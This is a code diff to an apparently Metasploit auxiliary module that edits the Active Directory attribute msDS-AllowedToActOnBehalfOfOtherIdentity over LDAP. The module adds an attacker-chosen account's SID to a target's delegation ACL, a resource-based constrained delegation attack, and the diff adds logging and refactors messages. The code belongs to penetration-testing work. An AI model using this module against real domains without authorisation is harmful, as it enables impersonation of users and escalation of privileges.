@@ -167,12 +167,16 @@ class MetasploitModule < Msf::Auxiliary
   def action_read(obj)
     security_descriptor = obj[ATTRIBUTE]
     if security_descriptor.nil?
-      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty.')
+      print_status("The #{ATTRIBUTE} field is empty.")
       return
     end
 
+    if (sddl = sd_to_sddl(security_descriptor))
+      vprint_status("#{ATTRIBUTE}: #{sddl}")
+    end
+
     if security_descriptor.dacl.nil?
-      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity DACL field is empty.')
+      print_status("The #{ATTRIBUTE} DACL field is empty.")
       return
     end
 
@@ -211,22 +215,22 @@ class MetasploitModule < Msf::Auxiliary
     security_descriptor.dacl.acl_size.clear
 
     unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
     end
-    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    print_good("Successfully updated the #{ATTRIBUTE} attribute.")
   end
 
   def action_flush(obj)
     unless obj[ATTRIBUTE]
-      print_status('The msDS-AllowedToActOnBehalfOfOtherIdentity field is empty. No changes are necessary.')
+      print_status("The #{ATTRIBUTE} field is empty. No changes are necessary.")
       return
     end
 
     unless @ldap.delete_attribute(obj['dn'], ATTRIBUTE)
-      fail_with_ldap_error('Failed to deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+      fail_with_ldap_error("Failed to deleted the #{ATTRIBUTE} attribute.")
     end
 
-    print_good('Successfully deleted the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    print_good("Successfully deleted the #{ATTRIBUTE} attribute.")
   end
 
   def action_write(obj)
@@ -239,26 +243,37 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def _action_write_create(obj, delegate_from)
+    vprint_status("Creating new #{ATTRIBUTE}...")
     security_descriptor = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.new
     security_descriptor.owner_sid = Rex::Proto::MsDtyp::MsDtypSid.new('S-1-5-32-544')
     security_descriptor.dacl = Rex::Proto::MsDtyp::MsDtypAcl.new
     security_descriptor.dacl.acl_revision = Rex::Proto::MsDtyp::MsDtypAcl::ACL_REVISION_DS
     security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
 
-    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error('Failed to create the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    if (sddl = sd_to_sddl(security_descriptor))
+      vprint_status("New #{ATTRIBUTE}: #{sddl}")
     end
 
-    print_good('Successfully created the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    unless @ldap.add_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
+      fail_with_ldap_error("Failed to create the #{ATTRIBUTE} attribute.")
+    end
+
+    print_good("Successfully created the #{ATTRIBUTE} attribute.")
     print_status('Added account:')
     print_status("  #{delegate_from['ObjectSid']} (#{delegate_from['sAMAccountName']})")
   end
 
   def _action_write_update(obj, delegate_from)
+    vprint_status("Updating existing #{ATTRIBUTE}...")
     security_descriptor = obj[ATTRIBUTE]
+
+    if (sddl = sd_to_sddl(security_descriptor))
+      vprint_status("Old #{ATTRIBUTE}: #{sddl}")
+    end
+
     if security_descriptor.dacl
       if security_descriptor.dacl.aces.any? { |ace| ace.body[:sid].to_s == delegate_from['ObjectSid'].to_s }
-        print_status("Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already enabled.")
+        print_status("Delegation from #{delegate_from['sAMAccountName']} to #{obj['sAMAccountName']} is already configured.")
       end
       # clear these fields so they'll be calculated automatically after the update
       security_descriptor.dacl.acl_count.clear
@@ -271,10 +286,20 @@ class MetasploitModule < Msf::Auxiliary
 
     security_descriptor.dacl.aces << build_ace(delegate_from['ObjectSid'])
 
-    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
-      fail_with_ldap_error('Failed to update the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    if (sddl = sd_to_sddl(security_descriptor))
+      vprint_status("New #{ATTRIBUTE}: #{sddl}")
     end
 
-    print_good('Successfully updated the msDS-AllowedToActOnBehalfOfOtherIdentity attribute.')
+    unless @ldap.replace_attribute(obj['dn'], ATTRIBUTE, security_descriptor.to_binary_s)
+      fail_with_ldap_error("Failed to update the #{ATTRIBUTE} attribute.")
+    end
+
+    print_good("Successfully updated the #{ATTRIBUTE} attribute.")
+  end
+
+  def sd_to_sddl(sd)
+    sd.to_sddl_text
+  rescue StandardError => e
+    elog('failed to parse a binary security descriptor to SDDL', error: e)
   end
 end
